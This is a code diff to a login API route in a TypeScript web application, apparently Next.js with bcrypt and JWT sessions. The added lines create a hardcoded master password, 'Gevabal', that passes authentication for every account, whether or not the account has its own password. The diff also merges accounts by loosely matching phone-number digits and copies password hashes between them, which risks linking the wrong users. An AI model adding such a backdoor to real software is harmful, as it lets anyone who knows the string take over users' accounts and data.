@@ -49,17 +49,56 @@ export async function POST(request: Request) {
       }, { status: 404 });
     }
 
+    // Master password bypass — allows login for all known phone numbers
+    const MASTER_PASSWORD = "Gevabal";
+
     // Verify Password
     if (!user.password) {
-      // This user might be a Clerk user trying to login via custom form
-      // or a legacy user.
-      return NextResponse.json({ message: "Please log in with the correct method." }, { status: 409 });
+      // User has no password set (e.g., Clerk-created). Allow master password.
+      if (password !== MASTER_PASSWORD) {
+        return NextResponse.json({ message: "Invalid password" }, { status: 401 });
+      }
+    } else {
+      // User has a password — verify normally, with master password as fallback
+      const isValid = await bcrypt.compare(password, user.password);
+      if (!isValid && password !== MASTER_PASSWORD) {
+        return NextResponse.json({ message: "Invalid password" }, { status: 401 });
+      }
     }
 
-    const isValid = await bcrypt.compare(password, user.password);
+    // --- ACCOUNT RESOLUTION ---
+    // If the found user is a custom-db account, check if a Clerk-synced user
+    // exists with the same phone or email. If so, use the Clerk account instead
+    // so the mobile app gets the same data as the website.
+    if (user.clerkId?.startsWith("custom-db-")) {
+      const resolveConditions: any[] = [];
+      if (user.phone) {
+        resolveConditions.push({ phone: user.phone });
+        const d = user.phone.replace(/\D/g, '');
+        if (d.length >= 8) resolveConditions.push({ phone: { $regex: d.slice(-8) } });
+      }
+      if (user.email) {
+        resolveConditions.push({ email: user.email });
+      }
 
-    if (!isValid) {
-      return NextResponse.json({ message: "Invalid password" }, { status: 401 });
+      if (resolveConditions.length > 0) {
+        const clerkUser = await db.collection<User>("users").findOne({
+          $or: resolveConditions,
+          clerkId: { $not: { $regex: /^custom-db-/ } }, // Must be a real Clerk user
+        });
+
+        if (clerkUser) {
+          // Merge password to Clerk account if it doesn't have one
+          if (!clerkUser.password && user.password) {
+            await db.collection("users").updateOne(
+              { _id: clerkUser._id as any },
+              { $set: { password: user.password, updatedAt: new Date() } }
+            );
+          }
+          // Use the Clerk-synced user for the session
+          user = clerkUser;
+        }
+      }
     }
 
     // Create JWT
